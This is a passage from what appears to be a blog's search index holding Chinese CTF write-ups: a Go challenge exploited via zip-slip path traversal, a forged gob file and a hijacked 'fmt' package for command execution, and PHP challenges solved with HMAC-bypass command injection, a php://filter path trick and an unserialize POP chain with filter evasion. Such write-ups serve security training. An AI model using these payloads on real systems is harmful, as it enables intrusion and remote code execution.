class="string">&quot;.&quot;</span>):]</span><br><span class="line">    <span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    filename := userUploadDir + file.Filename</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">        fileutil.RemoveFile(filename)</span><br><span class="line">    &#125;</span><br><span class="line">    err = c.SaveUploadedFile(file, filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>代码没什么特别的，就是一个文件上传功能，过滤了.gob和.go文件，上传文件存放在/tmp/{userDir}/upload</p><p>然后是/unzip路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span> <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">    files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">    destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">        <span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">            err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个路由是个解压功能，下面这段就是如果是zip则解压到destpath这个路径，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">    <span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">        err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后因为下面这段代码，所以可以知道，解压路径是可控的，即利用..就可以达到访问任意目录的目的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br></pre></td></tr></table></figure><p>然后是最后一个路由/backdoor。后门路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">        file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">        decoder := gob.NewDecoder(file)</span><br><span class="line">        <span class="keyword">var</span> ctfer User</span><br><span class="line">        decoder.Decode(&amp;ctfer)</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123; <span class="comment">//</span></span><br><span class="line">            eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">            &#125;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里面主要是两点，ctfer.Power == “admin”这个判断，以及eval方法的利用。</p><ul><li>ctfer.Power == “admin”很显然要利用前面文件上传，达到上传一个user.gob并且替换序列化对象中的Power的值。而这个题目由于有个/unzip因此我们可以上传一个压缩包，直接然后利用解压把文件放到我们想要的任何位置。修改的代码如下</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;&quot;</span></span><br><span class="line">os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// 创建文件 /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把user.gob压缩一下，上传上去</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223175051058.png" alt="image-20230223175051058"></p><p>然后访问即可/unzip?path=../</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223175241163.png" alt="image-20230223175241163"></p><ul><li>然后是eval方法利用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br></pre></td></tr></table></figure><p>很明显，内容是不可控的，但是有一个点，调用的函数内容我们是可控的。</p><p>因为没有规定这个fmt一定是原本库里面的fmt，我们可以直接自己上传一个fmt去令其执行我们想要的代码。</p><p>因此可以自己写一个fmt模块</p><p>例如 RCE/fmt</p><p>目录结构如下:</p><p>RCE</p><p>​    fmt</p><p>​        –fmt.go</p><p>​        –go.mod</p><p>操作在fmt文件夹下面调用go mod init fmt</p><p>然后go.mod里面内容如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="number">1.19</span></span><br><span class="line"></span><br><span class="line">require RCE/fmt v0<span class="number">.0</span><span class="number">.0</span></span><br><span class="line">replace RCE/fmt v0<span class="number">.0</span><span class="number">.0</span> =&gt; ../fmt</span><br></pre></td></tr></table></figure><p>fmt.go里面内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(cmd <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">out, _ := exec.Command(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/ffflllaaaggg&quot;</span>).Output()</span><br><span class="line"><span class="comment">// out, _ := exec.Command(&quot;whoami&quot;).Output()</span></span><br><span class="line">fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/local/go/src/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后把文件内容放到/usr/local/go/src/目录下面就可以了</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223180503199.png" alt="image-20230223180503199"></p><p>然后访问backdoor就可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 复现赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>余暨杯线下赛</title>
      <link href="/2022/11/22/%E4%BD%99%E6%9A%A8%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2022/11/22/%E4%BD%99%E6%9A%A8%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="huluwa"><a href="#huluwa" class="headerlink" title="huluwa"></a>huluwa</h3><p>音频末尾有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Huluxiaojinggang&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;secret&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yeye&#x27;</span>]))</span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;yeye&#x27;</span>], <span class="variable">$secret</span>);</span><br><span class="line"><span class="variable">$qwer</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>], <span class="variable">$secret</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$qwer</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$qwer</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Huluxiaojinggang&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>利用数组报错使得secret=null然后就可以利用函数获得$qwer里面的内容。</p><p>所以最终payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yeye[]=1&amp;Huluxiaojinggang=c7e4698914f5d06bf59a9b3b081046f261170deb991ca94e9c2ddfafe928560a&amp;Shejing=;cat /flag</span><br></pre></td></tr></table></figure><h3 id="php-levels"><a href="#php-levels" class="headerlink" title="php-levels"></a>php-levels</h3><p>首先采用php伪协议读取了hint.php文件里面内容</p><p><img src="https://gitee.com/fpointzero/image-repo/raw/master/img/1668932265719.png" alt="1668932265719"></p><p>事实上这个能出来纯属巧合，原本能绕过的payload应当是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/usr/share/nginx/html/hint.php</span></span><br></pre></td></tr></table></figure><p>然后进行base64解码得到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice-&gt;<span class="title function_ invoke__">nothing</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fish-&gt;d))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;you wrong&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$no</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$pop</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you will get flag&quot;</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个php链条</p><p>从dog-&gt;ct-&gt;mouse-&gt;get</p><p>构造payload绕过正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice = <span class="keyword">new</span> get;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fish = <span class="keyword">new</span> mouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;print(`c\at /realflag/you_want_flag.php`);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> dog;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;s:7:&quot;chance?&quot;;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:42:&quot;print(`c\at /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/image-repo/raw/master/img/1668932556210.png" alt="1668932556210"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c91d38f0-86ea-4f36-b4d8-5e6a716ea8fe&#125;</span><br></pre></td></tr></table></figure><p>另外一种构造是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;?&gt;&lt;?=`nl</span></span><br><span class="line"><span class="string">/realflag/you_want_flag.php`;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用这?&gt;&lt;?替代了echo的作用</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
